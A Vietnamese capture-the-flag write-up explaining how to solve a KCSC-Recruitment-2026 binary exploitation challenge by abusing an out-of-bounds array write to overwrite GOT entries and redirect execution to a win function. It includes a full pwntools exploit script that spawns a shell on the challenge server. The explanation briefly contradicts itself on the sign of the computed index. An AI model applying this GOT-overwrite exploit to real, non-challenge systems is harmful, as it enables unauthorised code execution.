# Easyyyyyyyyyyyyyyyy---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài Easyyyyyyyyyyyyyyyy của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 14/12/2025

## 1. Mục tiêu cần làm
Đầu tiên phân tích các lớp bảo vệ của bài

<img width="1121" height="232" alt="image" src="https://github.com/user-attachments/assets/0959e530-f01b-44e4-99a1-9d6ee0bc0f94" />

Chúng ta thấy `NO PIE`, `NO Canary` và đặc biệt `Partial RELRO` ( nghĩa là bảng GOT có quyền được ghi đè ). Liệu chúng ta có thể khai thác gì từ đây không ?

Tiếp theo hãy bắt đầu phân tích code bài. Khi chạy chúng sẽ thực thi như sau :
- Chương trình yêu cầu tạo một user đầu tiên, sau đó hiện `Menu`.
- Có các tính năng: `Create User`, `View Users`, `Make some noise`, `Exit`.
- Đặc biệt, có một hàm `win` không nằm trong luồng chạy bình thường nhưng tồn tại trong binary.

Khi đọc chúng ta sẽ phát hiện 1 lỗi ở hàm `input_player`

```C
__int64 input_player()
{
  __int64 v1; // [rsp+8h] [rbp-8h] BYREF

  printf("Input user 's id:");
  __isoc99_scanf("%llu", &v1);           // Cho phép nhập số bất kỳ
  printf("Input user 's name:");
  read(0, &users[80 * v1], 0x50uLL);    // Tính địa chỉ ghi dựa trên v1
  return v1;
}
```

Bất ngờ chưa bài này nó na ná bài `p_rho` mà mình từng giải ( https://github.com/Cunhotayto/p_rho---Write-up-----DreamHack ), bạn nào muốn tìm hiểu kĩ về lỗi **OOB** thì vô đọc nha. Vì đã làm về lỗi này rồi nên mình sẽ skip đến cách thực thi.

## 2.Cách thực thi
Vì chúng ta có thể ghi đè lên `GOT` bằng mảng `user` nên việc chúng ta cần bây giờ làm tìm ra khoảng cách `index` để `user[i]` trỏ vào. Sau đó chúng ta sẽ thay `printf@got` bằng `win` là lụm. Tại sao là `printf@got` ? Tại vì chương trình sẽ gọi `printf("User created! ID: %d\n", ...)`, nên chúng ta sẽ đè vào nó.

Vì mảng `user` là biến toàn cục nên nó sẽ nằm ở .bss mà .bss nằm sau .got nên chúng ta phải tìm ra offset từ `user` đến `system@got` rồi tính index. Tại sao không phải khoảng cách từ `user` đến `printf@got` mà phải là `system@got`. Tí là bạn sẽ hiểu.

Index = `(system_got - users_addr) // 80`  ( số này phải âm thì mới đi lùi được ). Khi tính thì nó sẽ ra số 2, siêu đẹp. Nhưng nếu ta xài `printf@got` thì nó ra -1.9 nên ta sẽ chọn `system@got`. Nhưng éo le là `system@got` lại nằm đằng trước `printf@got`.

<img width="870" height="356" alt="image" src="https://github.com/user-attachments/assets/e00922f3-288b-4352-abd9-bee44a30e9ab" />

Vậy nên ta phải gửi payload là `system@got + win`. Tại sao không phải là `AAA... + win` ? Khi chạy được `win` thì `win` lại gọi `system("/bin/sh");`, mà ta đè mẹ `system@got` rồi còn đâu nên chúng ta phải đè nó bằng chính nó.

Vậy là xong, bài này khá đơn giản. Hãy cho mình 1 star để có động lực viết tiếp nha 🐧.

## 3. Exploit

```Python
from pwn import *

exe = './vuln'
e = ELF(exe)
context.binary = exe
context.log_level = 'debug'

p = remote('67.223.119.69', 5000)

system_plt = e.plt['system']
win_addr = e.symbols['win']
users_addr = e.symbols['users']
system_got = e.got['system']

idx = (system_got - users_addr) // 80

p.sendlineafter(b"create a user.", b"DUMMY")

p.sendlineafter(b"choice:", b"1")
p.sendlineafter(b"id:", str(idx).encode())

payload = p64(system_plt) + p64(win_addr)

p.sendlineafter(b"name:", payload)

p.interactive()
```
